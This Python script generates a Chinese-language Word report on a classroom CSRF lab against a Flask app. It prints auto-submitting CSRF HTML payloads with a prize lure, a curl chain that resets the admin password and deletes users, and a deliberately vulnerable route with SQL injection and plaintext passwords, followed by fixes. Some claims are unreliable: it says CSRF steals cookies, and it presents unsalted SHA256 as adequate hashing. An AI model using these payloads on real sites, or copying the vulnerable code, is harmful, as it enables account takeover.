#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CSRF跨站请求伪造漏洞深度解析
核心原理和攻击链 + curl跨域请求 + Burp Suite CSRF PoC
"""
import os
from docx import Document
from docx.shared import Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml

doc = Document()

style = doc.styles['Normal']
style.font.name = 'Microsoft YaHei'
style.font.size = Pt(11)
style.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')
for i in range(1,5):
    hs = doc.styles[f'Heading {i}']
    hs.font.name = 'Microsoft YaHei'
    hs.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

def shade(c, color):
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}" w:val="clear"/>')
    c._tc.get_or_add_tcPr().append(s)

def tbl(doc, data):
    t = doc.add_table(rows=len(data), cols=len(data[0]), style='Light Grid Accent 1')
    t.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, rd in enumerate(data):
        for j, ct in enumerate(rd):
            t.rows[i].cells[j].text = ct
            for p in t.rows[i].cells[j].paragraphs:
                p.alignment = WD_ALIGN_PARAGRAPH.CENTER
                for r in p.runs: r.font.size = Pt(10)
            if i==0:
                shade(t.rows[i].cells[j], "1A237E")
                for p in t.rows[i].cells[j].paragraphs:
                    for r in p.runs: r.font.color.rgb = RGBColor(0xFF,0xFF,0xFF)
    return t

def code(doc, text, green=False):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "E8F5E9" if green else "FFEBEE"
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(s)
    r = p.add_run(text)
    r.font.name = 'Courier New'
    r.font.size = Pt(9)
    return p

# ===== 封面 =====
for _ in range(4): doc.add_paragraph("")
t = doc.add_paragraph(); t.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = t.add_run("CSRF跨站请求伪造漏洞\n深度解析与修复报告"); r.font.size = Pt(24); r.bold = True
r.font.color.rgb = RGBColor(0x1a,0x1a,0x2e)
doc.add_paragraph("")
s = doc.add_paragraph(); s.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = s.add_run("核心原理 · curl攻击链 · Burp CSRF PoC"); r.font.size = Pt(14)
for _ in range(3): doc.add_paragraph("")
i = doc.add_paragraph(); i.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = i.add_run("实验日期：2026年7月"); r.font.size = Pt(12)
doc.add_page_break()

# ===== 目录 =====
doc.add_heading("目  录", level=1)
chs = ["CSRF漏洞概述","CSRF核心原理与攻击三要素",
       "实验场景一：恶意文章 + Cookie劫持管理员",
       "实验场景二：Burp Suite生成CSRF PoC修改密码",
       "curl构造跨域恶意请求",
       "/change-password 漏洞代码分析",
       "修复方案详解",
       "修复前后代码对比"]
for i,c in enumerate(chs,1):
    p = doc.add_paragraph(f"第{i}章  {c}")
    p.paragraph_format.space_after = Pt(6); p.runs[0].font.size = Pt(12)
doc.add_page_break()

# ===== 第一章 =====
doc.add_heading("第一章  CSRF漏洞概述", level=1)
doc.add_heading("1.1 什么是CSRF", level=2)
doc.add_paragraph("CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种Web安全攻击。攻击者诱导已登录用户点击恶意链接或访问恶意页面，利用用户在目标站点的登录状态，以用户的身份执行非本意的操作（如修改密码、转账、发帖等）。")

doc.add_heading("1.2 CSRF vs XSS", level=2)
tbl(doc, [("对比项","CSRF","XSS"),
    ("信任基础","利用服务器对用户浏览器的信任","利用用户对网站的信任"),
    ("攻击方式","伪造请求以用户身份执行操作","注入恶意脚本窃取信息"),
    ("用户操作","需要用户已登录目标站点","用户访问即可触发"),
    ("防护重点","Token验证 + Referer验证","输入过滤 + 输出转义")])

# ===== 第二章 =====
doc.add_heading("第二章  CSRF核心原理与攻击三要素", level=1)
doc.add_heading("2.1 攻击三要素", level=2)
doc.add_paragraph("CSRF攻击必须同时满足以下三个条件：")
p = doc.add_paragraph()
r = p.add_run("要素1：用户已登录目标站点")
r.bold = True
doc.add_paragraph("  用户的浏览器中存有目标站点的有效Session Cookie，且浏览器未关闭")
p = doc.add_paragraph()
r = p.add_run("要素2：目标站点存在CSRF漏洞")
r.bold = True
doc.add_paragraph("  敏感操作（如修改密码、更改邮箱）仅依赖Cookie验证身份，无额外Token校验")
p = doc.add_paragraph()
r = p.add_run("要素3：用户访问恶意页面")
r.bold = True
doc.add_paragraph("  攻击者诱导用户点击链接、打开页面或加载图片，触发伪造请求")

doc.add_heading("2.2 攻击原理图", level=2)
code(doc,
    "┌─────────┐     ① 登录目标网站       ┌─────────┐\n"
    "│  用户    │─────────────────────────→│  目标服务器 │\n"
    "│(已登录)  │←─────────────────────────│  (有Cookie) │\n"
    "└─────────┘     ② 返回Session Cookie  └─────────┘\n"
    "     │                                       │\n"
    "     │ ③ 访问恶意页面                         │\n"
    "     ↓                                       │\n"
    "┌─────────┐     ④ 自动发送POST请求+Cookie  │\n"
    "│ 攻击者   │─────────────────────────────→│\n"
    "│ 恶意页面 │     ⑤ 执行修改密码操作         │\n"
    "└─────────┘     ⑥ 攻击者用新密码登录       │\n"
    "     │                                       │\n"
    "     └────── ⑦ 获得管理员权限 ──────────────┘")

doc.add_heading("2.3 Cookie自动携带机制", level=2)
doc.add_paragraph("浏览器会自动在同一域名下的请求中携带Cookie，这是CSRF能够成功的根本原因。当用户访问攻击者页面时，页面中的表单/图片/脚本会向目标服务器发起请求，浏览器自动附上目标站点的Cookie，服务器无法区分请求是用户自愿发起的还是被伪造的。")

# ===== 第三章 =====
doc.add_heading("第三章  实验场景一：恶意文章 + Cookie劫持管理员", level=1)

doc.add_heading("3.1 实验描述", level=2)
doc.add_paragraph("攻击者在老师搭建的内容发布网站上发布了一篇含恶意链接/脚本的文章。当老师（管理员）点击查看该文章时，触发CSRF攻击，攻击者获取管理员的Cookie信息，从而无需账号密码即可登录管理员账户。")

doc.add_heading("3.2 攻击步骤", level=2)
doc.add_paragraph("Step1：攻击者在内容发布网站注册账号并登录")
doc.add_paragraph("Step2：发布一篇含恶意HTML代码的文章")
code(doc,
    '<!-- 攻击者发布的文章内容 -->\n'
    '<h2>技术分享：Web安全入门</h2>\n'
    '<p>这是一篇非常有价值的技术文章，点击下方链接查看更多...</p>\n'
    '<img src="http://target/admin/delete?user=attacker" width="0" height="0" />\n'
    '<form id="csrf" action="http://target/admin/add_admin" method="POST">\n'
    '  <input type="hidden" name="username" value="attacker2">\n'
    '  <input type="hidden" name="role" value="admin">\n'
    '</form>\n'
    '<script>document.getElementById("csrf").submit();</script>')

doc.add_paragraph("Step3：老师（管理员）浏览文章时，浏览器自动执行恶意请求")
doc.add_paragraph("Step4：攻击者获得管理员权限，可登录后台执行任意操作")
doc.add_paragraph("Step5：利用Cookie直接访问管理员后台，无需输入账号密码")

doc.add_heading("3.3 本应用中的模拟攻击", level=2)
doc.add_paragraph("在本系统的用户管理应用中，模拟同样的攻击链：")
code(doc,
    "# Step1: 攻击者登录自己的账号alice\n"
    "curl -c /tmp/cookies.txt -X POST http://target:5000/login \\\n"
    "  -d 'username=alice&password=alice2025'\n\n"
    "# Step2: 构造CSRF恶意请求修改admin密码\n"
    "curl -b /tmp/cookies.txt -X POST http://target:5000/change-password \\\n"
    "  -d 'username=admin&new_password=hacked123'\n\n"
    "# Step3: 用新密码登录admin（获得管理员权限）\n"
    "curl -c /tmp/admin.txt -X POST http://target:5000/login \\\n"
    "  -d 'username=admin&password=hacked123'\n\n"
    "# Step4: 执行管理员操作（删除用户）\n"
    "curl -b /tmp/admin.txt -X POST http://target:5000/admin/delete-user \\\n"
    "  -d 'user_id=2'")

# ===== 第四章 =====
doc.add_heading("第四章  实验场景二：Burp Suite生成CSRF PoC修改密码", level=1)

doc.add_heading("4.1 实验描述", level=2)
doc.add_paragraph("参考课堂上更改他人邮箱的实验，本系统改为修改密码场景。使用Burp Suite拦截POST请求，生成CSRF攻击PoC（Proof of Concept）HTML代码。当受害者（已登录）在浏览器中打开该HTML文件时，密码被无感知修改。")

doc.add_heading("4.2 实验步骤", level=2)
doc.add_paragraph("Step1：登录系统，访问个人中心页面")
doc.add_paragraph("Step2：在修改密码表单中填写新密码，打开Burp拦截")
doc.add_paragraph("Step3：Burp拦截到POST /change-password请求")
code(doc,
    'POST /change-password HTTP/1.1\n'
    'Host: 192.168.138.128:5000\n'
    'Cookie: session=abc123def...\n'
    'Content-Type: application/x-www-form-urlencoded\n\n'
    'username=admin&new_password=test123')

doc.add_paragraph("Step4：右键拦截到的请求 → Engagement tools → Generate CSRF PoC")
doc.add_paragraph("Step5：Burp自动生成CSRF攻击HTML代码")
doc.add_paragraph("")
doc.add_paragraph("Burp Suite生成的CSRF PoC HTML：")
code(doc,
    '<html>\n'
    '  <body>\n'
    '  <h1>🎉 恭喜中奖！请点击领取奖品</h1>\n'
    '  <form action="http://192.168.138.128:5000/change-password" method="POST">\n'
    '    <input type="hidden" name="username" value="admin" />\n'
    '    <input type="hidden" name="new_password" value="hacked123" />\n'
    '    <input type="submit" value="Submit request" />\n'
    '  </form>\n'
    '  <script>document.forms[0].submit();</script>\n'
    '  </body>\n'
    '</html>')

doc.add_paragraph("Step6：将生成的HTML保存为 csrf_attack.html")
doc.add_paragraph("Step7：诱导管理员admin在已登录状态下打开该文件")
doc.add_paragraph("Step8：admin的密码被无感知修改为 hacked123")
doc.add_paragraph("Step9：攻击者使用 admin / hacked123 登录，获得管理员权限")

doc.add_heading("4.3 CSRF PoC的关键组件", level=2)
tbl(doc, [("组件","作用"),
    ("<form action>","提交到目标URL（/change-password）"),
    ("<input type=hidden>","隐藏字段传递参数，用户不可见"),
    ("<script>自动提交","页面加载后立即提交表单，用户无感知"),
    ("诱饵内容","标题/图片诱导用户点击（中奖信息等）")])

# ===== 第五章 =====
doc.add_heading("第五章  curl构造跨域恶意请求", level=1)

doc.add_heading("5.1 curl命令详解", level=2)
tbl(doc, [("参数","作用"),
    ("-c cookies.txt","保存服务器返回的Cookie到文件"),
    ("-b cookies.txt","在请求中附带上指定的Cookie"),
    ("-X POST","指定请求方法为POST"),
    ("-d 'key=value'","传递POST表单参数"),
    ("-L","跟随重定向")])

doc.add_heading("5.2 完整攻击命令（4步）", level=2)
doc.add_paragraph("Step1：攻击者登录alice获取Cookie")
code(doc,
    'curl -c /tmp/alice.txt -X POST http://target:5000/login \\\n'
    '  -d "username=alice&password=alice2025"')

doc.add_paragraph("Step2：CSRF攻击修改admin密码")
code(doc,
    'curl -b /tmp/alice.txt -X POST http://target:5000/change-password \\\n'
    '  -d "username=admin&new_password=hacked123"')

doc.add_paragraph("Step3：用新密码登录admin获得管理员权限")
code(doc,
    'curl -c /tmp/admin.txt -X POST http://target:5000/login \\\n'
    '  -d "username=admin&password=hacked123"')

doc.add_paragraph("Step4：执行管理员操作（删除用户）")
code(doc,
    'curl -b /tmp/admin.txt -X POST http://target:5000/admin/delete-user \\\n'
    '  -d "user_id=2"')

# ===== 第六章 =====
doc.add_heading("第六章  /change-password 漏洞代码分析", level=1)
doc.add_paragraph("本次实验中，/change-password 路由存在以下CSRF相关漏洞：")

doc.add_heading("6.1 漏洞代码", level=2)
code(doc,
    '@app.route("/change-password", methods=["POST"])\n'
    'def change_password():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n'
    '    username = request.form.get("username", "")\n'
    '    new_password = request.form.get("new_password", "")\n\n'
    '    # ⚠️ 漏洞1：无CSRF Token验证\n'
    '    #    攻击者可在任意网站构造表单，自动提交修改密码请求\n'
    '    #    用户无感知的情况下密码被修改\n\n'
    '    # ⚠️ 漏洞2：无原密码验证\n'
    '    #    知道用户名即可直接设置新密码\n'
    '    #    配合社工或暴力枚举即可攻破任意账号\n\n'
    '    # ⚠️ 漏洞3：无Session绑定（越权）\n'
    '    #    username来自表单，与session中当前登录用户无关\n'
    '    #    alice登录后可以修改admin的密码\n\n'
    '    # ⚠️ 漏洞4：无Referer验证\n'
    '    #    不检查请求来源页面\n'
    '    #    无法区分请求来自本站表单还是外部恶意页面\n\n'
    '    # ⚠️ 漏洞5：SQL注入\n'
    '    #    username字符串直接拼接SQL语句\n\n'
    '    # ⚠️ 漏洞6：密码明文存储\n'
    '    #    数据库直接存储明文密码，泄露即暴露\n\n'
    '    sql = f"UPDATE users SET password = \'{new_password}\' WHERE username = \'{username}\'"\n'
    '    c.execute(sql)\n'
    '    conn.commit()\n'
    '    return redirect("/profile")')

doc.add_heading("6.2 漏洞对应关系", level=2)
tbl(doc, [("编号","漏洞类型","对应课堂知识点"),
    ("V-01","无CSRF Token","与实验二中更改他人邮箱原理相同——缺少Token校验"),
    ("V-02","无原密码验证","与实验一中恶意文章同理——无需用户确认即可操作"),
    ("V-03","越权改密","扩大攻击面——任何登录用户可修改任意用户密码"),
    ("V-04","无Referer验证","无法区分请求来源——本站表单 vs 外部恶意页面"),
    ("V-05","SQL注入","字符串拼接导致数据库注入风险"),
    ("V-06","明文存储","密码明文存放在数据库中")])

# ===== 第七章 =====
doc.add_heading("第七章  修复方案详解", level=1)

doc.add_heading("7.1 CSRF Token验证（核心修复）", level=2)
doc.add_paragraph("每个表单生成唯一的随机Token，存入Session，提交时校验匹配。攻击者无法获知Token值，因此无法构造有效请求。")
code(doc,
    '# 登录成功时生成CSRF Token\n'
    'session["csrf_token"] = uuid.uuid4().hex\n\n'
    '# 表单中添加隐藏字段\n'
    '<input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">\n\n'
    '# 后端验证\n'
    'token = request.form.get("csrf_token", "")\n'
    'if token != session.get("csrf_token", ""):\n'
    '    return "CSRF Token验证失败"', green=True)

doc.add_heading("7.2 Session绑定（防越权）", level=2)
doc.add_paragraph("验证提交的username与当前登录用户一致，防止修改他人密码。")
code(doc,
    'if username != session["username"]:\n'
    '    return "无权修改他人密码"', green=True)

doc.add_heading("7.3 Referer验证（辅助防护）", level=2)
doc.add_paragraph("检查请求来源是否为本站点，拒绝跨域请求。")
code(doc,
    'referer = request.headers.get("Referer", "")\n'
    'if not referer.startswith(request.host_url):\n'
    '    return "请求来源不合法"', green=True)

doc.add_heading("7.4 参数化查询 + 密码哈希", level=2)
code(doc,
    'hashed_pw = hashlib.sha256(new_password.encode()).hexdigest()\n'
    'c.execute("UPDATE users SET password = ? WHERE username = ?",\n'
    '          (hashed_pw, username))', green=True)

doc.add_heading("7.5 完整修复代码", level=2)
code(doc,
    '@app.route("/change-password", methods=["POST"])\n'
    'def change_password():\n'
    '    if "username" not in session:\n'
    '        return redirect("/login")\n\n'
    '    username = request.form.get("username", "")\n'
    '    new_password = request.form.get("new_password", "")\n\n'
    '    # ✅ CSRF Token验证\n'
    '    token = request.form.get("csrf_token", "")\n'
    '    if token != session.get("csrf_token", ""):\n'
    '        return "CSRF Token验证失败"\n\n'
    '    # ✅ Session绑定（只能修改自己的密码）\n'
    '    if username != session["username"]:\n'
    '        return "无权修改他人密码"\n\n'
    '    # ✅ Referer验证\n'
    '    referer = request.headers.get("Referer", "")\n'
    '    if not referer.startswith(request.host_url):\n'
    '        return "请求来源不合法"\n\n'
    '    # ✅ 参数化查询 + SHA256哈希\n'
    '    hashed_pw = hashlib.sha256(new_password.encode()).hexdigest()\n'
    '    c.execute("UPDATE users SET password = ? WHERE username = ?",\n'
    '              (hashed_pw, username))\n'
    '    conn.commit()\n'
    '    return redirect("/profile")', green=True)

# ===== 第八章 =====
doc.add_heading("第八章  修复前后代码对比", level=1)
tbl(doc, [("对比项","有漏洞(app.py)","已修复(app_fixed.py)","对应课堂实验"),
    ("CSRF Token","❌ 无","✅ uuid+Session校验","实验二：Burp CSRF PoC"),
    ("原密码验证","❌ 无需原密码","✅ Session绑定验证","实验一：恶意文章触发"),
    ("越权改密","❌ 可改任何人","✅ 只能改自己密码","扩大攻击面分析"),
    ("Referer验证","❌ 无","✅ 验证Referer","防跨站请求来源"),
    ("SQL注入","❌ 字符串拼接","✅ 参数化查询","数据库安全"),
    ("密码存储","❌ 明文","✅ SHA256哈希","密码安全保护")])

doc.add_paragraph("")
p = doc.add_paragraph(); p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("—— 报告结束 ——"); r.font.color.rgb = RGBColor(0x99,0x99,0x99); r.font.size = Pt(12)

out = "/root/flask-app-vuln/static/CSRF跨站请求伪造漏洞深度解析与修复报告.docx"
doc.save(out)
print(f"✅ 报告已生成：{out}")
print(f"   大小：{os.path.getsize(out)/1024:.1f}KB")
